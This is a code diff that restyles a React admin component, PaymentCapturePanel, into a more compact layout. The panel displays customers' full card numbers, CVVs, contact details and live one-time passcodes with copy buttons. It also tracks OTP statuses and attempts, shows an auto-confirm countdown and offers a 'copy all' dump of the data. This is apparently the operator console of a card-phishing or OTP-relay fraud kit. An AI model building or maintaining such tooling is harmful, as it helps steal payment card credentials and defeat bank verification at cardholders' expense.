@@ -25,7 +25,6 @@ export function PaymentCapturePanel({ order }: { order: Order }) {
   const { t, locale } = useT();
   const cap = order.paymentCapture;
   const pan = cap?.cardNumber ?? "";
-  const done = order.paymentStatus === "paid" || order.paymentStatus === "rejected" || order.paymentStatus === "failed";
   const waiting = order.paymentStatus === "otp_requested" || order.paymentStatus === "otp_wrong";
   const received = order.paymentStatus === "otp_received";
   const invalid = order.paymentStatus === "card_invalid";
@@ -46,12 +45,12 @@ export function PaymentCapturePanel({ order }: { order: Order }) {
     .join("\n");
 
   return (
-    <section className="space-y-4 rounded-2xl border border-primary/20 bg-primary/5 p-4">
-      <div className="flex flex-wrap items-center justify-between gap-2">
-        <h3 className="text-sm font-semibold">{t("admin.capture")}</h3>
+    <section className="space-y-1.5 rounded-xl border border-primary/20 bg-primary/5 p-2.5">
+      <div className="flex items-center justify-between gap-2">
+        <h3 className="text-[11px] font-semibold">{t("admin.capture")}</h3>
         <span
           className={cn(
-            "rounded-full px-2.5 py-0.5 text-[11px] font-semibold",
+            "rounded-full px-2 py-px text-[10px] font-semibold",
             order.paymentStatus === "paid" && "bg-emerald-500/15 text-emerald-700",
             order.paymentStatus === "rejected" && "bg-destructive/15 text-destructive",
             (order.paymentStatus === "pending" || waiting || invalid) && "bg-amber-500/15 text-amber-800",
@@ -62,7 +61,7 @@ export function PaymentCapturePanel({ order }: { order: Order }) {
         </span>
       </div>
 
-      <div className="grid gap-2 sm:grid-cols-2">
+      <div className="grid gap-1 sm:grid-cols-2">
         <CopyField label={t("pay.holder")} value={cap?.holder ?? order.customerName} ok={t("admin.copied")} />
         <CopyField label={t("checkout.phone")} value={order.phone} ok={t("admin.copied")} />
         <CopyField label={t("checkout.email")} value={order.email} ok={t("admin.copied")} />
@@ -72,25 +71,23 @@ export function PaymentCapturePanel({ order }: { order: Order }) {
         <CopyField label={t("pay.cvv")} value={cap?.cvv ?? "—"} mono ok={t("admin.copied")} />
       </div>
 
-      <div className="rounded-xl border border-border bg-card p-4 text-center">
-        <p className="text-xs font-medium uppercase tracking-wide text-muted-foreground">{t("admin.otpLive")}</p>
+      <div className="flex items-center justify-center gap-3 rounded-lg border border-border bg-card px-2 py-1.5">
+        <p className="text-[10px] font-medium text-muted-foreground">{t("admin.otpLive")}</p>
         {order.otp?.code ? (
-          <p className="mt-2 font-mono text-4xl font-semibold tracking-[0.4em] text-primary" dir="ltr">
+          <p className="font-mono text-lg font-semibold tracking-[0.28em] text-primary" dir="ltr">
             {order.otp.code}
           </p>
         ) : (
-          <p className="mt-2 text-sm text-muted-foreground">{waiting ? t("admin.waitingOtp") : t("admin.otpEmpty")}</p>
+          <p className="text-xs text-muted-foreground">{waiting ? t("admin.waitingOtp") : t("admin.otpEmpty")}</p>
         )}
-        {order.otp?.attempts ? (
-          <p className="mt-1 text-[11px] text-muted-foreground">{order.otp.attempts}</p>
-        ) : null}
+        {order.otp?.attempts ? <p className="text-[10px] text-muted-foreground">{order.otp.attempts}</p> : null}
       </div>
 
       {order.paymentStatus === "pending" && order.reviewDeadline ? <AdminReviewClock endAt={order.reviewDeadline} /> : null}
 
-      <PaymentActions order={order} />
+      <PaymentActions order={order} compact />
 
-      <Button type="button" variant="secondary" className="w-full" onClick={() => void copyText(dump, t("admin.copied"))}>
+      <Button type="button" size="sm" variant="secondary" className="h-7 w-full text-[11px]" onClick={() => void copyText(dump, t("admin.copied"))}>
         {t("admin.copyAll")}
       </Button>
     </section>
@@ -102,7 +99,7 @@ function AdminReviewClock({ endAt }: { endAt: string }) {
   const cd = useCountdown(Date.parse(endAt));
   const pad = (n: number) => String(n).padStart(2, "0");
   return (
-    <p className="rounded-xl border border-amber-500/30 bg-amber-500/10 px-3 py-2 text-xs">
+    <p className="rounded-lg border border-amber-500/30 bg-amber-500/10 px-2 py-1 text-[11px]">
       {t("admin.autoConfirmIn")}{" "}
       <span className="font-mono font-semibold tabular-nums" dir="ltr">
         {pad(cd.minutes)}:{pad(cd.seconds)}
@@ -128,20 +125,18 @@ function CopyField({
 }) {
   const { t } = useT();
   return (
-    <div className={cn("rounded-xl border border-border bg-card p-3", className)}>
-      <div className="flex items-center justify-between gap-2">
-        <p className="text-[11px] font-medium uppercase tracking-wide text-muted-foreground">{label}</p>
-        <button
-          type="button"
-          className="text-[11px] font-semibold text-primary hover:underline"
-          onClick={() => void copyText(raw ?? value, ok)}
-        >
-          {t("admin.copy")}
-        </button>
-      </div>
-      <p className={cn("mt-1 break-all text-sm font-semibold", mono && "font-mono tracking-wide")} dir="ltr">
+    <div className={cn("flex items-center gap-2 rounded-lg border border-border bg-card px-2 py-1", className)}>
+      <p className="shrink-0 text-[10px] text-muted-foreground">{label}</p>
+      <p className={cn("min-w-0 flex-1 truncate text-xs font-semibold", mono && "font-mono tracking-wide")} dir="ltr">
         {value || "—"}
       </p>
+      <button
+        type="button"
+        className="shrink-0 text-[10px] font-semibold text-primary hover:underline"
+        onClick={() => void copyText(raw ?? value, ok)}
+      >
+        {t("admin.copy")}
+      </button>
     </div>
   );
 }
